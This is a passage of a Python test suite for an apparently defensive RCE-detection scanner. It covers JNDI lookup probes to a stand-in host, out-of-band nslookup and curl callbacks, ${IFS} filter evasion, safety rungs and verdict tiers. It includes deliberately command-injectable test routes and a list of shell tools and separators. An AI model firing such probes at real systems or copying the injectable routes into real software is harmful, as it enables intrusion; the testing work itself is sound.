        return method, method.build_probes(self.rec, _random.Random(1))

    def test_it_does_not_run_without_an_oob_host(self):
        # It makes the target open outbound connections, so it stays off until
        # the operator names the host. No probes is `nothing-tested`, which the
        # engine reports for itself -- never `negative`.
        self.assertFalse(rcekit.LookupCallback(self.gen, {}).applicable(self.rec))
        self.assertTrue(
            rcekit.LookupCallback(self.gen, {"oob_host": "x.example"}).applicable(self.rec))

    def test_every_probe_is_a_lookup_and_never_a_command(self):
        _, probes = self._probes({"oob_host": "x.example"})
        self.assertTrue(probes)
        for probe in probes:
            with self.subTest(payload=probe.payload):
                self.assertIn("jndi:", probe.payload)
                # The thing that makes this method necessary: no shell anywhere.
                for shellish in ("nslookup", "curl", "wget", "certutil", "iwr", ";", "|", "&&"):
                    self.assertNotIn(shellish, probe.payload)

    def test_the_default_rung_sends_only_the_shape_that_resolves_a_name(self):
        """`jndi:dns://` can do nothing but resolve a name.

        `ldap://` and `rmi://` continue *past* resolution and connect to
        whatever address the answer named -- by default 127.0.0.1, the target's
        own loopback. Whatever replies on :389 or :1099 is not RCEKit, so a
        reference could come back and a class be instantiated. That is a real
        difference in what a probe can cause, so it is a rung rather than a
        reason to delete the shapes: they were deleted once, and deleting
        coverage to describe it honestly is the wrong trade."""
        # Through the filter rather than around it: build_probes builds every
        # shape, and the rung is what decides which of them a run sends.
        import random as _random
        gen = RCEKit()
        method = rcekit.LookupCallback(gen, {"oob_host": "x.example"})
        sent = gen._apply_target_profile(
            method, method.build_probes(self.rec, _random.Random(1)))
        self.assertTrue(sent)
        for probe in sent:
            with self.subTest(payload=probe.payload):
                self.assertIn("jndi:dns://", probe.payload)
                for reaches_a_service in ("ldap", "rmi", "iiop", "corbaname", "nis"):
                    self.assertNotIn(reaches_a_service, probe.payload)

    def test_the_top_rung_sends_the_shapes_that_reach_a_service(self):
        # The coverage the rung exists to make available: a sink that filters
        # `dns:` and not `ldap:` is exactly the sink this method is for.
        _, probes = self._probes({"oob_host": "x.example", "max_safety": "stateful"})
        schemes = {probe.carrier for probe in probes}
        self.assertEqual(schemes, {"dns", "ldap", "rmi"})
        for probe in probes:
            with self.subTest(payload=probe.payload):
                if probe.carrier == "dns":
                    self.assertIsNone(probe.safety, "a name lookup needs no extra rung")
                else:
                    self.assertEqual(probe.safety, "stateful", probe.payload)

    def test_a_shape_that_reaches_a_service_is_held_back_by_default(self):
        """The rung has to be enforced, not merely written on the probe.

        A `safety` field nothing reads is a label, and a label that does not
        hold anything back is the kind of claim this project exists to refuse.
        """
        import random as _random
        gen = RCEKit()
        method = rcekit.LookupCallback(gen, {"oob_host": "x.example"})
        built = method.build_probes(self.rec, _random.Random(1))
        self.assertEqual({p.carrier for p in built}, {"dns", "ldap", "rmi"})
        kept = gen._apply_target_profile(method, built)
        self.assertEqual({p.carrier for p in kept}, {"dns"})
        self.assertEqual(gen.safety_held_probes, len(built) - len(kept))
        # And it says which flag would send them, because a ladder that shrinks
        # quietly is indistinguishable from a target with nothing to find.
        self.assertTrue(any("--verify-active-risk stateful" in reason
                            for reason in gen.safety_held_reasons))

    def test_each_probe_carries_its_own_token(self):
        # Sharing one token would mark every form confirmed as soon as any one
        # called back, and the report would name payloads that did nothing.
        _, probes = self._probes({"oob_host": "x.example"})
        tokens = [p.expected for p in probes]
        self.assertEqual(len(tokens), len(set(tokens)))
        for probe in probes:
            self.assertIn(probe.expected, probe.payload)

    def test_a_bare_ip_builds_nothing_rather_than_unattributable_probes(self):
        # `<token>.10.0.0.1` resolves nowhere, and a lookup has no second channel
        # to carry the token. Probes that could never be correlated are requests
        # that cannot confirm.
        _, probes = self._probes({"oob_host": "10.0.0.1"})
        self.assertEqual(probes, [])

    def test_an_ipv6_literal_is_a_literal_too(self):
        """A private copy of the address test was a weaker one.

        It split on '.' and asked for four digit groups, so `::1` and `[::1]`
        read as hostnames and became authorities like `rk….[::1]` -- not a DNS
        label the token can ride in, and not a URL. The probes went out and
        every one came back `negative`: "we reached the target and found
        nothing", about a channel that was never addressable. `OobCallback`'s
        test already knew this, so there is one test now and not two."""
        for literal in ("::1", "[::1]", "2001:db8::4", "[2001:db8::4]"):
            with self.subTest(oob_host=literal):
                _, probes = self._probes({"oob_host": literal})
                self.assertEqual(probes, [])

    def test_the_token_rides_in_the_payload_so_observe_must_skip_it(self):
        # The second-order channel may only look for a value the payload does
        # not already carry, or a target that merely stores the payload would
        # hand the token back by reflection and every probe would read confirmed.
        _, probes = self._probes({"oob_host": "x.example"})
        for probe in probes:
            result = {"expected": probe.expected, "payload": probe.payload}
            self.assertFalse(RCEKit._observable(result))

    def test_it_proves_the_sink_on_a_resolver_and_not_on_a_reflector(self):
        """The direct false-positive gate: /vuln resolves the URI it was handed,
        /reflect echoes it verbatim."""
        import random as _random
        import re as _re

        listener = rcekit.OOBListener()
        config = {"oob_host": "x.example", "oob_listener": listener, "oob_wait": 0.2}
        method = rcekit.LookupCallback(self.gen, config)
        probes = method.build_probes(self.rec, _random.Random(3))
        self.assertTrue(probes)

        # /vuln: the sink resolves the name inside the expression, which is what
        # a lookup sink does -- recorded here as the listener would record it.
        for probe in probes:
            host = _re.search(r"jndi:\w+://([^/]+)/", probe.payload).group(1)
            listener.record("dns", "10.0.0.9", host)
        resolved = method.confirm_each([(p, Observation(200, "ok")) for p in probes])
        self.assertTrue(resolved)
        for probe, verdict in resolved:
            self.assertEqual(verdict.status, "lookup-sink", probe.payload)
            self.assertIn("proves the lookup, not a gadget chain", verdict.evidence)

        # /reflect: the payload comes back in the body and nothing is resolved.
        quiet = rcekit.OOBListener()
        echo = rcekit.LookupCallback(
            self.gen, {"oob_host": "x.example", "oob_listener": quiet, "oob_wait": 0.2})
        echoed = echo.build_probes(self.rec, _random.Random(4))
        verdicts = echo.confirm_each([(p, Observation(200, p.payload)) for p in echoed])
        self.assertTrue(verdicts)
        for probe, verdict in verdicts:
            self.assertNotEqual(verdict.status, "lookup-sink", probe.payload)

    def test_a_delivery_failure_is_an_error_not_a_negative(self):
        import random as _random
        listener = rcekit.OOBListener()
        method = rcekit.LookupCallback(
            self.gen, {"oob_host": "x.example", "oob_listener": listener, "oob_wait": 0.1})
        probes = method.build_probes(self.rec, _random.Random(5))
        verdicts = method.confirm_each([(p, Observation(None, "connection refused")) for p in probes])
        self.assertTrue(all(v.status == "error" for _, v in verdicts))

    def test_without_a_listener_it_reports_error(self):
        import random as _random
        method = rcekit.LookupCallback(self.gen, {"oob_host": "x.example"})
        probes = method.build_probes(self.rec, _random.Random(6))
        verdicts = method.confirm_each([(p, Observation(200, "ok")) for p in probes])
        self.assertTrue(all(v.status == "error" for _, v in verdicts))

    def test_it_is_registered_and_does_not_claim_execution(self):
        """The tier rule, at the point it would have been broken.

        A callback proves the sink resolved a URI RCEKit chose. It does not
        prove the target ran attacker code -- Log4Shell becomes RCE when the
        LDAP server answers with a loadable class, and this listener answers
        with nothing. Emitting `executed` would print a DNS resolution under
        the EXECUTED heading and hand it to JSON consumers as RCE."""
        self.assertIs(rcekit.DETECTION_METHODS["lookup"], rcekit.LookupCallback)
        self.assertEqual(rcekit.LookupCallback.tier, "lookup-sink")
        self.assertNotEqual(rcekit.LookupCallback.tier, "executed")

    def test_a_callback_never_produces_a_confirmed_verdict(self):
        import random as _random
        import re as _re

        listener = rcekit.OOBListener()
        method = rcekit.LookupCallback(
            self.gen, {"oob_host": "x.example", "oob_listener": listener, "oob_wait": 0.2})
        probes = method.build_probes(self.rec, _random.Random(11))
        for probe in probes:
            host = _re.search(r"jndi:\w+://([^/]+)/", probe.payload).group(1)
            listener.record("dns", "10.0.0.9", host)
        verdicts = method.confirm_each([(p, Observation(200, "ok")) for p in probes])
        self.assertTrue(verdicts)
        for probe, verdict in verdicts:
            self.assertEqual(verdict.status, "lookup-sink", probe.payload)

    def test_the_overall_verdict_never_folds_it_into_execution(self):
        # A proven sink outranks a clean run and is outranked only by proven
        # execution, exactly as `deserialization-sink` is.
        self.assertEqual(
            rcekit.overall_detection_verdict([{"verdict": "lookup-sink"}]), "lookup-sink")
        self.assertEqual(rcekit.overall_detection_verdict(
            [{"verdict": "lookup-sink"}, {"verdict": "executed"}]), "executed")
        # And above `needs-review`, which it did not used to be. A proven
        # lookup outranks the only thing left under `needs-review` -- `deser`'s
        # shape fingerprint, which is a guess.
        self.assertEqual(rcekit.overall_detection_verdict(
            [{"verdict": "lookup-sink"}, {"verdict": "needs-review"}]), "lookup-sink")


class TierVocabularyTestCase(unittest.TestCase):
    """The old verdict names are gone from the module, not merely unused.

    A rename that leaves one branch spelling the old name produces a verdict
    no consumer expects and no test asks for, and `--detect-json` is a
    published schema. Read from the source with `ast` rather than by grepping,
    so a mention inside a docstring or a comment about the history -- of which
    this release deliberately leaves several -- does not read as a live
    literal.
    """

    RETIRED = ("confirmed",)

    def _string_constants(self):
        source = Path(rcekit.__file__).read_text(encoding="utf-8")
        for node in ast.walk(ast.parse(source)):
            if isinstance(node, ast.Constant) and isinstance(node.value, str):
                yield node

    def test_no_retired_verdict_name_survives_as_a_literal(self):
        for node in self._string_constants():
            for retired in self.RETIRED:
                # An exact match is a status; the word inside a sentence is
                # prose, and the report still uses "confirmed" as a verb.
                if node.value == retired:
                    self.fail(f"rcekit.py line {node.lineno} still carries the "
                              f"retired verdict {retired!r} as a bare literal")

    def test_every_verdict_the_engine_emits_is_one_of_the_documented_names(self):
        """The other direction. A tier spelled one way on the class and another
        in the branch that emits it is two verdicts, and only one is documented."""
        documented = {rcekit.EXECUTION_TIER, "timing-sink", "file-write",
                      "evaluation-sink", "deserialization-sink", "lookup-sink",
                      "needs-review", "negative", "inconclusive", "blocked",
                      "error", "nothing-tested"}
        emitted = set()
        for method in rcekit.DETECTION_METHODS.values():
            emitted |= {method.tier} | set(method.also_reports)
        undocumented = sorted(emitted - documented)
        self.assertEqual(undocumented, [],
                         f"the engine emits {undocumented}, which the verdict "
                         f"vocabulary does not name")


class NonExecutionSectionTestCase(unittest.TestCase):
    """The report's sections for verdicts that are proven and are not
    execution: that each tier has one, that none describes a tier nothing
    emits, and that there is exactly one thing deciding their order.

    Two regressions live here.

    The first: the cleanup line was printed in exactly two places in the whole
    report -- the execution section, and the NEEDS-REVIEW block `write`'s
    uninterpreted file shared with `time`, `boolean` and `deser`'s fingerprint.
    Giving it its own tier moved it out of the only block that printed it, and
    a `file-write` finding has left a file on the target.

    The second, and the reason this class was rewritten: `deserialization-sink`
    and `lookup-sink` were hand-written blocks *above* the table holding the
    other four. Where they sat was an ordering claim, and nothing compared it
    to `overall_detection_verdict` -- which ranks the four above them. A run
    reporting both `timing-sink` and `deserialization-sink` collapsed to the
    first and led the report with the second.

    The order test that was here did not catch it, and the way it failed is
    the point: it looped over the table and checked each pair against the
    collapsed verdict, so it checked three quarters of the sequence and read as
    though it checked the sequence. Both now come off one table, which makes
    that comparison vacuous, so the order is pinned two other ways -- written
    out by hand below, and structurally, by there being nowhere else for a
    section to be rendered from.
    """

    def _sections(self):
        return {verdict: (heading, closing, compact)
                for verdict, heading, closing, compact in rcekit.NON_EXECUTION_SECTIONS}

    def test_every_non_execution_tier_the_engine_emits_has_a_section(self):
        """Written from the classes, so a tier added later cannot report into a
        run that prints no section for it."""
        emitted = set()
        for method in rcekit.DETECTION_METHODS.values():
            emitted |= {method.tier} | set(method.also_reports)
        emitted -= {rcekit.EXECUTION_TIER}
        missing = sorted(emitted - set(self._sections()))
        self.assertEqual(missing, [],
                         f"no report section for {missing}, which a method emits")

    def test_the_sections_describe_no_tier_the_engine_cannot_emit(self):
        """The other direction: a section for a verdict nothing produces is a
        paragraph describing a finding the tool cannot reach."""
        emitted = set()
        for method in rcekit.DETECTION_METHODS.values():
            emitted |= {method.tier} | set(method.also_reports)
        stale = sorted(set(self._sections()) - emitted)
        self.assertEqual(stale, [],
                         f"the report has a section for {stale}, which nothing emits")

    # The triage order, written out. Not derived from anything the
    # implementation uses, because `VERDICT_PRIORITY` and the report now read
    # the same table -- so a test comparing those two agrees with itself.
    EXPECTED_PRIORITY = (
        "executed",
        "timing-sink",
        "file-write",
        "evaluation-sink",
        "deserialization-sink",
        "lookup-sink",
        "needs-review",
    )

    def test_the_priority_is_the_one_written_out_here(self):
        self.assertEqual(tuple(rcekit.VERDICT_PRIORITY), self.EXPECTED_PRIORITY)

    def test_each_adjacent_pair_collapses_to_the_stronger_finding(self):
        """The order as behaviour, pair by pair, against the hand-written list.

        `executed` over a delay honoured; a delay honoured over a file written;
        a file written over an evaluator; an evaluator over a deserialization
        sink; that over a lookup sink; and every one of them over the single
        candidate `deser` reports without a listener."""
        for stronger, weaker in zip(self.EXPECTED_PRIORITY,
                                    self.EXPECTED_PRIORITY[1:]):
            with self.subTest(stronger=stronger, weaker=weaker):
                self.assertEqual(
                    rcekit.overall_detection_verdict(
                        [{"verdict": weaker}, {"verdict": stronger}]),
                    stronger)

    def test_the_report_renders_every_section_from_the_one_table(self):
        """The structural half, and the one that would have caught the bug.

        A hand-written block for a particular verdict is an ordering claim
        expressed as the position of a statement, which no test can compare to
        anything. So there must not be one: inside `main`, the only verdict
        compared against a literal is the execution tier, whose section is
        deliberately separate because its heading takes a different shape and
        it closes on no sentence about what it fails to prove. Every other
        verdict is reached by iterating the table, in the table's order."""
        source = Path(rcekit.__file__).read_text(encoding="utf-8")
        main = next(node for node in ast.parse(source).body
                    if isinstance(node, ast.FunctionDef) and node.name == "main")
        sectioned = set(self._sections())
        hand_written = {}
        for node in ast.walk(main):
            if isinstance(node, ast.Compare) and isinstance(node.ops[0], ast.Eq):
                for operand in node.comparators:
                    if isinstance(operand, ast.Constant) and operand.value in sectioned:
                        hand_written.setdefault(operand.value, []).append(node.lineno)
        self.assertEqual(
            hand_written, {},
            f"main() singles out {sorted(hand_written)} by name, so where that "
            f"block sits decides where it prints -- which is the claim "
            f"NON_EXECUTION_SECTIONS exists to hold instead")

    def test_each_section_says_what_it_does_not_prove(self):
        for verdict, (heading, closing, _compact) in self._sections().items():
            with self.subTest(verdict=verdict):
                self.assertTrue(heading.strip(), verdict)
                # The closing sentence is what stops a proven non-execution
                # finding being read as RCE, which is the whole reason these
                # are separate sections rather than one list.
                self.assertTrue(len(closing) > 40, f"{verdict}: {closing!r}")

    def test_only_the_two_blob_carrying_tiers_truncate_their_payload(self):
        """`compact` is a formatting flag and stays a flag.

        It exists because `deser` sends base64 object streams and `lookup`
        sends JNDI URIs, and because neither has an `environment` worth
        printing. Anything more would be a formatting language in a table,
        which is how the last attempt at this grew out of hand."""
        compact = {verdict for verdict, (_h, _c, flag) in self._sections().items()
                   if flag}
        self.assertEqual(compact, {"deserialization-sink", "lookup-sink"})


class OobCallbackTestCase(unittest.TestCase):
    """Out-of-band detection. A fully blind sink -- nothing in the response, no
    writable web root -- had no path to an `executed` verdict at all."""

    def setUp(self):
        self.gen = RCEKit()
        self.rec = make_record(environment="unix", context="raw")

    def _probes(self, config):
        import random as _random
        method = rcekit.OobCallback(self.gen, config)
        return method, method.build_probes(self.rec, _random.Random(1))

    def test_it_does_not_run_without_an_oob_host(self):
        # It makes the target open outbound connections, so it stays off until
        # the operator names the host.
        self.assertFalse(rcekit.OobCallback(self.gen, {}).applicable(self.rec))
        self.assertTrue(
            rcekit.OobCallback(self.gen, {"oob_host": "x.example"}).applicable(self.rec))

    def test_each_separator_gets_its_own_token(self):
        # Sharing one token would mark every separator confirmed as soon as any
        # one called back -- and `cmd || curl` never runs when cmd succeeds, so
        # the report would name payloads that did nothing.
        _, probes = self._probes({"oob_host": "x.example"})
        tokens = [p.expected for p in probes]
        self.assertEqual(len(tokens), len(set(tokens)))
        for probe in probes:
            with self.subTest(payload=probe.payload):
                self.assertIn(probe.expected, probe.payload)

    def test_a_named_host_gets_dns_shapes(self):
        _, probes = self._probes({"oob_host": "x.example"})
        self.assertTrue(any("nslookup" in p.payload for p in probes))
        self.assertTrue(any(f"{p.expected}.x.example" in p.payload for p in probes))

    def test_a_computed_value_rides_in_one_dns_label(self):
        # The callback then proves the shell evaluated arithmetic, not merely
        # that something resolved a name it was handed.
        method, probes = self._probes({"oob_host": "x.example"})
        computed = [p for p in probes if "$((" in p.payload]
        self.assertTrue(computed)
        self.assertIsNotNone(method._computed)

    def test_an_ip_host_puts_the_token_in_the_path_and_drops_dns(self):
        # `<token>.10.0.0.1` resolves nowhere, so those probes could never call
        # back; the token rides in the URL path instead.
        _, probes = self._probes({"oob_host": "10.0.0.1"})
        self.assertTrue(probes)
        self.assertFalse([p for p in probes if "nslookup" in p.payload or "host " in p.payload])
        for probe in probes:
            with self.subTest(payload=probe.payload):
                self.assertIn(f"/{probe.expected}", probe.payload)
                self.assertNotIn(f"{probe.expected}.10.0.0.1", probe.payload)

    def test_ip_literal_detection(self):
        for host in ("10.0.0.1", "127.0.0.1", "::1", "[fe80::1]"):
            self.assertTrue(rcekit.OobCallback._is_ip_literal(host), host)
        for host in ("x.example", "a.b.c.d", "999.1.1.1", "target.local"):
            self.assertFalse(rcekit.OobCallback._is_ip_literal(host), host)

    def test_a_probe_whose_token_came_back_is_confirmed_and_others_are_not(self):
        listener = OOBListener()
        method = rcekit.OobCallback(self.gen, {"oob_host": "x.example",
                                               "oob_listener": listener, "oob_wait": 0.1})
        import random as _random
        probes = method.build_probes(self.rec, _random.Random(1))
        arrived = probes[0]
        listener.record("dns", "10.0.0.9", f"{arrived.expected}.x.example")
        series = [(p, Observation(status=200, body="ok")) for p in probes]
        verdicts = dict((p.payload, v.status) for p, v in method.confirm_each(series))
        self.assertEqual(verdicts[arrived.payload], "executed")
        self.assertEqual({v for payload, v in verdicts.items() if payload != arrived.payload},
                         {"negative"})

    def test_a_delivery_failure_is_an_error_not_a_negative(self):
        listener = OOBListener()
        method = rcekit.OobCallback(self.gen, {"oob_host": "x.example",
                                               "oob_listener": listener, "oob_wait": 0.1})
        import random as _random
        probes = method.build_probes(self.rec, _random.Random(1))[:1]
        series = [(probes[0], Observation(status=None, body="connection refused"))]
        self.assertEqual(method.confirm_each(series)[0][1].status, "error")

    def test_without_a_listener_nothing_is_reported_as_negative(self):
        # A missing listener means we could not have seen a callback; calling
        # that 'not vulnerable' is exactly the lie the error tier exists for.
        method = rcekit.OobCallback(self.gen, {"oob_host": "x.example"})
        import random as _random
        probes = method.build_probes(self.rec, _random.Random(1))[:1]
        series = [(probes[0], Observation(status=200, body="ok"))]
        self.assertEqual(method.confirm_each(series)[0][1].status, "error")

    def test_end_to_end_a_blind_sink_is_confirmed_via_the_callback(self):
        import os
        listener = OOBListener()
        port = listener.start_http(0).server_address[1]

        def route(method, path, params, headers, body):
            # Blind: runs the command, returns nothing about it.
            pipe = sh_popen("echo probing " + params.get("q", "") + " >/dev/null 2>&1")
            pipe.read()
            pipe.close()
            return 200, "queued"

        try:
            with local_target(route) as base:
                results = self.gen.run_detection(
                    [self.rec], url=f"{base}/x?q=FUZZ", methods=["oob"],
                    config={"oob_host": "127.0.0.1", "oob_http_port": port,
                            "oob_listener": listener, "oob_wait": 3.0})
        finally:
            listener._servers[0].shutdown()
        confirmed = [r for r in results if r["verdict"] == "executed"]
        if not confirmed:
            self.skipTest("no HTTP fetch tool (curl/wget) available in this environment")
        self.assertTrue(all(r["tier"] == "executed" for r in confirmed))

    def test_a_non_executing_sink_produces_no_callback(self):
        listener = OOBListener()
        port = listener.start_http(0).server_address[1]

        def route(method, path, params, headers, body):
            return 200, f"you searched for: {params.get('q', '')}"

        try:
            with local_target(route) as base:
                results = self.gen.run_detection(
                    [self.rec], url=f"{base}/x?q=FUZZ", methods=["oob"],
                    config={"oob_host": "127.0.0.1", "oob_http_port": port,
                            "oob_listener": listener, "oob_wait": 1.0})
        finally:
            listener._servers[0].shutdown()
        self.assertTrue(results)
        self.assertFalse([r for r in results if r["verdict"] == "executed"])


class ProbeRoundsTestCase(unittest.TestCase):
    """An aggregate method may answer with a further probe batch once it has
    seen the first — screening cheaply before paying for an expensive
    measurement. The engine bounds the rounds so a method cannot drive it
    forever against a live target."""

    def test_rounds_are_bounded(self):
        self.assertGreaterEqual(RCEKit.MAX_PROBE_ROUNDS, 2)

        class Endless(rcekit.DetectionMethod):
            name = "endless"
            aggregate = True
            rounds = 0

            def applicable(self, record):
                return True

            def build_probes(self, record, rng):
                return [Probe(payload="x", expected="")]

            def next_probes(self, series):
                Endless.rounds += 1
                return [Probe(payload=f"x{Endless.rounds}", expected="")]

            def confirm_series(self, series):
                return Verdict("negative", f"{len(series)} probes fired")

        gen = RCEKit()
        rcekit.DETECTION_METHODS["endless"] = Endless
        try:
            def route(method, path, params, headers, body):
                return 200, "ok"

            with local_target(route) as base:
                results = gen.run_detection(
                    [make_record(environment="unix", context="raw")],
                    url=f"{base}/x?q=FUZZ", methods=["endless"],
                    config={"contexts_explicit": True})
        finally:
            del rcekit.DETECTION_METHODS["endless"]
        self.assertEqual(len(results), 1)
        self.assertIn(f"{RCEKit.MAX_PROBE_ROUNDS} probes fired", results[0]["detail"])


class SpaceFilterTestCase(unittest.TestCase):
    """Stripping spaces is a filter of the same family as stripping ';' — it
    looks like it disarms command injection and does not, because `${IFS}` is a
    space as far as the shell is concerned. Every other probe carries a space,
    so before this a target exploitable by anyone who has met the filter
    reported clean unless the operator thought to pass `--evade low`."""

    def setUp(self):
        self.gen = RCEKit()
        self.rec = make_record(environment="unix", context="raw")

    def _payloads(self, config=None):
        import random as _random
        method = ReflectedMath(self.gen, config or {})
        return [p.payload for p in method.build_probes(self.rec, _random.Random(1))]

    def test_a_space_free_probe_is_sent_by_default(self):
        space_free = [p for p in self._payloads() if " " not in p]
        self.assertTrue(space_free, "every probe carries a space, so a space filter blocks all")
        self.assertTrue(all("${IFS}" in p for p in space_free), space_free)

    def test_the_separator_loses_its_trailing_space_too(self):
        # "; echo…" would reintroduce the very character the sink strips. No
        # shell needs the space after ';' or '&&'.
        for payload in (p for p in self._payloads() if "${IFS}" in p):
            with self.subTest(payload=payload):
                self.assertNotIn(" ", payload)

    def test_the_newline_separator_survives_the_space_free_shape(self):
        # A newline is not a space, so a space-stripping sink passes it through.
        self.assertTrue(any(p.startswith("\n") and "${IFS}" in p for p in self._payloads()))

    def test_quick_depth_still_sends_the_space_free_shape(self):
        # It costs one shape and closes a whole filter class, so it is not part
        # of the depth trade-off.
        self.assertTrue([p for p in self._payloads({"probe_depth": "quick"}) if " " not in p])

    def test_the_ladder_carries_no_duplicates_at_any_rung(self):
        # The rung used to coat every probe, which made the dedicated space-free
        # shape a second copy of one already in the ladder. It is a retry now,
        # so the ladder is the same at every rung -- and still has to be free of
        # duplicates, which is what a wasted request would look like.
        for rung in rcekit.EVASION_RUNGS:
            with self.subTest(rung=rung):
                payloads = self._payloads({"evade": rung})
                self.assertEqual(len(payloads), len(set(payloads)))
                self.assertTrue([p for p in payloads if " " not in p],
                                "the space-free shape must be sent at every rung")

    def test_the_expected_value_is_still_unforgeable(self):
        import random as _random
        for probe in ReflectedMath(self.gen, {}).build_probes(self.rec, _random.Random(5)):
            with self.subTest(payload=probe.payload):
                self.assertNotIn(probe.expected, probe.payload)

    def test_a_space_filtering_sink_is_confirmed_with_no_flags(self):
        import os

        def route(method, path, params, headers, body):
            query = params.get("q", "").replace(" ", "")
            pipe = sh_popen("echo probing " + query + " 2>/dev/null")
            out = pipe.read()
            pipe.close()
            return 200, out

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/x?q=FUZZ", methods=["reflected"])
        self.assertTrue([r for r in results if r["verdict"] == "executed"])

    def test_a_space_filtering_sink_that_is_inert_stays_negative(self):
        def route(method, path, params, headers, body):
            return 200, "you searched for: " + params.get("q", "").replace(" ", "")

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/x?q=FUZZ", methods=["reflected"])
        self.assertTrue(results)
        self.assertFalse([r for r in results if r["verdict"] == "executed"])


class MethodSafetyRungTestCase(unittest.TestCase):
    """Every method declares the rung it needs, and the engine reads it.

    The corpus has labelled its payloads `safe`/`intrusive`/`stateful` from the
    start, and the query-language bridges followed. Detection methods did not:
    each risky one was gated by a hand-written branch in `main()` naming it, so
    a new method meant remembering to add another -- and a probe shape with
    nowhere to declare its rung was deleted rather than gated, which is how
    `lookup` lost `ldap://` and `rmi://`.
    """

    def test_every_registered_method_declares_a_rung_that_exists(self):
        for name, method in rcekit.DETECTION_METHODS.items():
            with self.subTest(method=name):
                self.assertIn(method.safety, rcekit.SAFETY_ORDER,
                              f"{name} declares a rung that is not one of "
                              f"{sorted(rcekit.SAFETY_ORDER)}")

    def test_a_method_that_makes_the_target_call_out_is_not_safe(self):
        # The rung is what an operator chooses on; a callback method sitting at
        # `safe` would make the target open outbound connections on a run that
        # asked for none.
        for name, method in rcekit.DETECTION_METHODS.items():
            if not method.needs_oob_host:
                continue
            with self.subTest(method=name):
                self.assertGreater(rcekit.SAFETY_ORDER[method.safety],
                                   rcekit.SAFETY_ORDER["safe"],
                                   f"{name} needs a callback host but claims to be safe")

    def test_every_secondary_tier_is_a_verdict_and_not_the_ceiling(self):
        for name, method in rcekit.DETECTION_METHODS.items():
            for tier in method.also_reports:
                with self.subTest(method=name, tier=tier):
                    self.assertNotEqual(tier, method.tier,
                                        "also_reports repeats the method's own tier")
                    self.assertNotEqual(tier, rcekit.EXECUTION_TIER,
                                        f"{name} lists the execution tier as a "
                                        f"weaker tier")

    def test_the_weaker_tiers_a_method_reports_are_the_ones_it_says(self):
        # Pinned against the code that emits them, so the declaration cannot
        # quietly stop being true.
        declared = {name: set(method.also_reports)
                    for name, method in rcekit.DETECTION_METHODS.items()
                    if method.also_reports}
        self.assertEqual(declared, {"write": {"file-write"},
                                    "deser": {"needs-review"}})

    def test_needs_review_is_left_with_one_reporter(self):
        """The point of the 3.0.0 retier, as a property rather than a rename.

        `needs-review` had four reporters and three of them had measured their
        answer. It is now `deser`'s shape fingerprint alone -- the one signal
        that really is a candidate -- and that is what makes the word mean
        something again. A settled measurement arriving here is the regression."""
        reporters = {name for name, method in rcekit.DETECTION_METHODS.items()
                     if "needs-review" in {method.tier} | set(method.also_reports)}
        self.assertEqual(reporters, {"deser"})

    def test_a_probe_inherits_its_method_rung_unless_it_names_its_own(self):
        method = rcekit.LookupCallback(RCEKit(), {"oob_host": "x.example"})
        self.assertEqual(method.probe_safety(rcekit.Probe(payload="x", expected="y")),
                         method.safety)
        self.assertEqual(
            method.probe_safety(rcekit.Probe(payload="x", expected="y", safety="stateful")),
            "stateful")

    def test_a_held_probe_is_counted_apart_from_a_profile_drop(self):
        """Two filters, two tallies, because they say different things.

        A profile drop means the probe *could not have* reached the sink. A
        safety hold means it could, and the operator chose not to send it.
        Reporting them as one number would state the first about the second.
        """
        import random as _random
        gen = RCEKit()
        method = rcekit.LookupCallback(gen, {"oob_host": "x.example"})
        gen._apply_target_profile(method, method.build_probes(
            make_record(environment="java", context="raw"), _random.Random(1)))
        self.assertGreater(gen.safety_held_probes, 0)
        self.assertEqual(gen.profile_dropped_probes, 0)

    def test_the_two_stateful_methods_are_gated_by_their_own_configuration(self):
        # `file` and `write` change the target and say so, but naming a
        # directory to write into and a URL to read it back from is a narrower
        # statement than a rung -- and asking for the flag as well would refuse
        # a command that works today.
        gated = {name for name, method in rcekit.DETECTION_METHODS.items()
                 if method.gated_by_config}
        self.assertEqual(gated, {"file", "write"})
        for name in gated:
            with self.subTest(method=name):
                self.assertEqual(rcekit.DETECTION_METHODS[name].safety, "stateful")


class ConfigGatedRungTestCase(unittest.TestCase):
    """A method gated by its configuration must not be re-gated by the rung.

    `file` and `write` declare `stateful`, and the pre-flight lets them through
    when their channel is configured. The runtime filter did not know that, so
    it read the run's default `safe` ceiling and held every probe inheriting
    the method's rung: the CLI accepted a documented invocation and then
    reported `nothing-tested`, which is the quietest way this tool can fail and
    reads exactly like a clean target.

    Nothing caught it because every test built the method's config directly,
    without `max_safety` -- so the ceiling fell back to the method's own rung
    and the probes went out. The one thing that would have caught it is a run
    through the CLI with the channel configured, which is what
    `test_file_confirms_through_the_cli_at_the_default_tier` is.
    """

    REC = None

    def setUp(self):
        self.rec = make_record(environment="unix", context="raw")

    def _sent(self, method_cls, config):
        import random as _random
        gen = RCEKit()
        method = method_cls(gen, config)
        built = method.build_probes(self.rec, _random.Random(1))
        return built, gen._apply_target_profile(method, built), gen

    def test_a_config_gated_method_sends_at_the_default_tier(self):
        config = {"webroot": "/var/www/html", "web_base_url": "http://t/",
                  "max_safety": "safe"}
        built, sent, gen = self._sent(rcekit.FileBased, config)
        self.assertTrue(built)
        self.assertEqual(len(sent), len(built),
                         "a configured `file` run held its own probes back")
        self.assertEqual(gen.safety_held_probes, 0)

    def test_a_method_not_gated_by_config_still_obeys_the_tier(self):
        # The exception is narrow: it does not leak to `oob` or `lookup`.
        built, sent, gen = self._sent(
            rcekit.LookupCallback, {"oob_host": "x.example", "max_safety": "safe"})
        self.assertTrue(built)
        self.assertEqual(sent, [])
        self.assertEqual(gen.safety_held_probes, len(built))

    def test_the_exception_does_not_lift_a_shape_above_the_method_rung(self):
        # `gated_by_config` admits the method's own rung, not everything above
        # it. No shipped method has a shape above `stateful`, so this pins the
        # rule rather than a current case.
        gen = RCEKit()
        method = rcekit.FileBased(gen, {"webroot": "/var/www/html",
                                        "web_base_url": "http://t/",
                                        "max_safety": "safe"})
        self.assertTrue(gen._safety_allows(
            method, rcekit.Probe(payload="p", expected="e")))
        self.assertEqual(gen._safety_ceiling(method),
                         rcekit.SAFETY_ORDER["stateful"])


class ReachPastTheTierTestCase(unittest.TestCase):
    """A shape whose effect a notice undoes goes out, and the run says so.

    Reach wins where reach and restriction pull against each other. Detection
    the tool could have done and did not is a false negative wearing a safety
    label, and it costs more than the noise it saves. `safety` stays for the
    other case -- an effect a notice cannot take back, like a file written or
